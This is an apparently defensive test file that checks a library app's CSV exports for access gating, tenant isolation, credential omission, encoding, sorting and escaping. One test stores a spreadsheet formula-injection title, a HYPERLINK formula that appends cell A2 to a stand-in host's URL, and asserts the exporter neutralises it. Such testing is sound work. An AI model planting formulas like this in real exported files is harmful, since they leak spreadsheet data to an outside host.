import { afterAll, beforeAll, beforeEach, expect, test } from "vitest";
import { migrate } from "../../../src/db/migrate";
import { lendCopy } from "../../../src/domain/circulation/commands/lend-copy";
import { receiveReturn } from "../../../src/domain/circulation/commands/receive-return";
import { voidLoan } from "../../../src/domain/circulation/commands/void-loan";
import { fixedClock } from "../../../src/domain/kernel/clock";
import { RuleViolated } from "../../../src/domain/kernel/errors";
import type { TenantContext } from "../../../src/domain/kernel/tenant";
import { runCommand, runQuery } from "../../../src/domain/kernel/unit-of-work";
import {
  exportBooks,
  exportLoans,
  exportReaders,
} from "../../../src/domain/shelf/queries/exports";
import { toCsv, toCsvBytes } from "../../../src/lib/csv";
import { booksTable, loansTable, readersTable } from "../../../src/lib/exports";
import { closeAll, resetDatabase, sql } from "../../support/db";
import {
  makeBookWithCopies,
  makeMember,
  makeParishUnits,
  makeShelf,
} from "../../support/factories";
import { managerContextFor } from "../../support/scenarios";

beforeAll(() => migrate(sql));
beforeEach(resetDatabase);
afterAll(closeAll);

/**
 * OPS §3.3's three exports, and P1 §3.5's two demands about them: the
 * `manager` gate is **provable by test**, and the file contains nothing BR
 * §16.1 does not already show a manager on screen.
 */

async function shelfWithManager(slug: string) {
  const shelf = await makeShelf(sql, { slug });
  const manager = await makeMember(sql, shelf.id, { role: "manager" });
  return { shelf, manager, ctx: managerContextFor(shelf.id, manager) };
}

function readerCtx(bookshelfId: string, member: { id: string; userId: string }) {
  return {
    bookshelfId,
    actor: { userId: member.userId, membershipId: member.id, role: "reader" },
    clock: fixedClock("2026-08-07T10:00:00Z"),
  } as const satisfies TenantContext;
}

test("a reader cannot run any of the three exports", async () => {
  // §3.5(a), in full: all three, named individually, because a gate that is on
  // two of three is the shape a `toEqual` over a loop would hide.
  const { shelf } = await shelfWithManager("dong-thap");
  const reader = await makeMember(sql, shelf.id);
  const ctx = readerCtx(shelf.id, reader);

  await expect(runQuery(sql, ctx, exportBooks)).rejects.toThrow(RuleViolated);
  await expect(runQuery(sql, ctx, exportReaders)).rejects.toThrow(RuleViolated);
  await expect(runQuery(sql, ctx, exportLoans)).rejects.toThrow(RuleViolated);
});

test("a manager of one shelf exports nothing of another's", async () => {
  const a = await shelfWithManager("dong-thap");
  const b = await shelfWithManager("vinh-long");

  const bookB = await makeBookWithCopies(sql, b.shelf.id, 3);
  const readerB = await makeMember(sql, b.shelf.id);
  await runCommand(sql, b.ctx, lendCopy, {
    copyId: bookB.copyIds[0],
    membershipId: readerB.id,
  });

  expect(await runQuery(sql, a.ctx, exportBooks)).toEqual([]);
  expect(await runQuery(sql, a.ctx, exportLoans)).toEqual([]);
  // Not `[]`: Đồng Tháp has its own manager, and that membership is a row this
  // export is meant to carry. What must not appear is Vĩnh Long's reader.
  const readers = await runQuery(sql, a.ctx, exportReaders);
  expect(readers).toHaveLength(1);
  expect(readers[0].fullName).not.toBe("");

  const namesInB = (await runQuery(sql, b.ctx, exportReaders)).map(
    (r) => r.fullName,
  );
  expect(namesInB).not.toContain(readers[0].fullName);
});

test("the readers export carries no username and no hash", async () => {
  // §3.5(b) and INV-14. `has_credentials` is the boolean `getReaderDetail`
  // already substitutes on screen; the file answers "can this child sign in
  // from home" without being a list of accounts to try.
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const reader = await makeMember(sql, shelf.id);
  await sql`
    update users set username = 'minh.tran', password_hash = '$argon2id$secret'
    where id = ${reader.userId}
  `;

  const rows = await runQuery(sql, ctx, exportReaders);
  const csv = toCsv(...tableOf(readersTable(rows)));

  expect(csv).not.toContain("minh.tran");
  expect(csv).not.toContain("argon2");
  expect(csv).toContain("Có tài khoản đăng nhập");
  expect(rows.find((r) => r.fullName)?.hasCredentials !== undefined).toBe(true);
});

/** `CsvTable` → `toCsv`'s two arguments, so a test reads as one call. */
function tableOf(table: { headers: string[]; rows: string[][] }) {
  return [table.headers, table.rows] as const;
}

test("a title beginning with = is not a formula by the time it reaches the file", async () => {
  // §5's acceptance criterion, end to end rather than at the encoder: the title
  // goes into `books` through SQL, comes out through the real query, is turned
  // into a table by the real mapper and encoded by the real encoder. A unit
  // test of `toCsv` alone would stay green against a column that bypassed it.
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const { bookId } = await makeBookWithCopies(sql, shelf.id, 1);
  await sql`
    update books
    set title = '=HYPERLINK("http://x.tld/"&A2,"Bấm vào đây")'
    where id = ${bookId}
  `;

  const csv = toCsv(...tableOf(booksTable(await runQuery(sql, ctx, exportBooks))));
  const titleCell = csv.split("\r\n")[1].split(",")[0];

  expect(titleCell.startsWith("=")).toBe(false);
  expect(titleCell.startsWith('"=')).toBe(false);
  expect(csv).toContain("HYPERLINK"); // nothing was deleted
});

test("the books file opens as UTF-8 with the mark Excel needs", async () => {
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const { bookId } = await makeBookWithCopies(sql, shelf.id, 2);
  await sql`update books set title = 'Đất Rừng Phương Nam' where id = ${bookId}`;

  const bytes = toCsvBytes(
    ...tableOf(booksTable(await runQuery(sql, ctx, exportBooks))),
  );
  expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
  const text = new TextDecoder("utf-8").decode(bytes);
  expect(text).toContain("Đất Rừng Phương Nam");
  // One row per copy, not per title — the file is a stocktaking sheet.
  expect(text.trimEnd().split("\r\n")).toHaveLength(3);
});

test("the books export sorts Đ where a reader expects it, not last", async () => {
  // The collation trap's first half. This cluster sorts by bytes, and `Đ` is
  // `C4 90` — above every ASCII letter — so an unfolded `order by title` puts
  // every Đất Rừng and Đặng at the end of the file.
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  for (const title of ["Vừa Nhắm Mắt", "Đất Rừng Phương Nam", "Ai Cũng Có"]) {
    const { bookId } = await makeBookWithCopies(sql, shelf.id, 1);
    await sql`update books set title = ${title} where id = ${bookId}`;
  }

  const titles = (await runQuery(sql, ctx, exportBooks)).map((r) => r.title);
  expect(titles).toEqual(["Ai Cũng Có", "Đất Rừng Phương Nam", "Vừa Nhắm Mắt"]);
});

test("the readers export sorts Đ the same way and names the shelf's own units", async () => {
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  await sql`update users set full_name = 'Vũ Thị Mai' where id = ${
    (
      await sql<{ user_id: string }[]>`
      select user_id from memberships where bookshelf_id = ${shelf.id}
    `
    )[0].user_id
  }`;
  const units = await makeParishUnits(
    sql,
    shelf.id,
    { levels: 2, nested: true, level1Label: "Giáo họ", level2Label: "Tổ" },
    [
      { level: 1, name: "Thánh Tâm" },
      { level: 2, name: "Tổ 3", parentName: "Thánh Tâm" },
    ],
  );

  const dang = await makeMember(sql, shelf.id);
  await sql`update users set full_name = 'Đặng Thị Kim Chi' where id = ${dang.userId}`;
  await sql`
    update memberships
    set parish_unit_l1_id = ${units.get("Thánh Tâm")!},
        parish_unit_l2_id = ${units.get("Tổ 3")!}
    where id = ${dang.id}
  `;
  const an = await makeMember(sql, shelf.id);
  await sql`update users set full_name = 'An Nguyễn' where id = ${an.userId}`;

  const rows = await runQuery(sql, ctx, exportReaders);
  expect(rows.map((r) => r.fullName)).toEqual([
    "An Nguyễn",
    "Đặng Thị Kim Chi",
    "Vũ Thị Mai",
  ]);
  // `describeSelection`'s line — the shelf's own unit names, never two uuids.
  expect(rows[1].parishLine).toBe("Tổ 3 · Thánh Tâm");
});

test("the loans export is history, voided loans and their reasons included", async () => {
  // INV-11: loans are never deleted, so "CSV of loan history" means all of
  // them. BR §11's whole argument for voiding rather than deleting is that
  // "why is there no loan here" has an answer six months later, and the answer
  // is the reason — so it has to be in the file.
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const one = await makeBookWithCopies(sql, shelf.id, 1);
  const two = await makeBookWithCopies(sql, shelf.id, 1);
  const reader = await makeMember(sql, shelf.id);
  await sql`update users set full_name = 'Giuse Trần Minh' where id = ${reader.userId}`;

  const kept = await runCommand(sql, ctx, lendCopy, {
    copyId: one.copyIds[0],
    membershipId: reader.id,
  });
  await runCommand(sql, ctx, receiveReturn, {
    loanId: kept.loanId,
    condition: "slightly_worn",
  });
  const scrapped = await runCommand(sql, ctx, lendCopy, {
    copyId: two.copyIds[0],
    membershipId: reader.id,
  });
  await runCommand(sql, ctx, voidLoan, {
    loanId: scrapped.loanId,
    reason: "Bấm nhầm, sách vẫn ở trên kệ",
  });

  const rows = await runQuery(sql, ctx, exportLoans);
  expect(rows).toHaveLength(2);

  const csv = toCsv(...tableOf(loansTable(rows)));
  expect(csv).toContain("Đã trả");
  expect(csv).toContain("Hơi cũ");
  expect(csv).toContain("Đã huỷ");
  expect(csv).toContain("Bấm nhầm, sách vẫn ở trên kệ");
  expect(csv).toContain("Giuse Trần Minh");
  // Every enum is a Vietnamese word. The English spellings are the database's
  // and must not reach a volunteer's spreadsheet.
  for (const raw of ["returned", "voided", "slightly_worn", "active"]) {
    expect(csv, raw).not.toContain(raw);
  }
});

test("a free-text reason with a comma, a quote and a newline survives", async () => {
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const { copyIds } = await makeBookWithCopies(sql, shelf.id, 1);
  const reader = await makeMember(sql, shelf.id);
  const { loanId } = await runCommand(sql, ctx, lendCopy, {
    copyId: copyIds[0],
    membershipId: reader.id,
  });
  const reason = 'Bấm nhầm, mẹ em nói "chưa mượn"\nsẽ mượn tuần sau';
  await runCommand(sql, ctx, voidLoan, { loanId, reason });

  const csv = toCsv(...tableOf(loansTable(await runQuery(sql, ctx, exportLoans))));
  expect(csv).toContain('"Bấm nhầm, mẹ em nói ""chưa mượn""\nsẽ mượn tuần sau"');
});
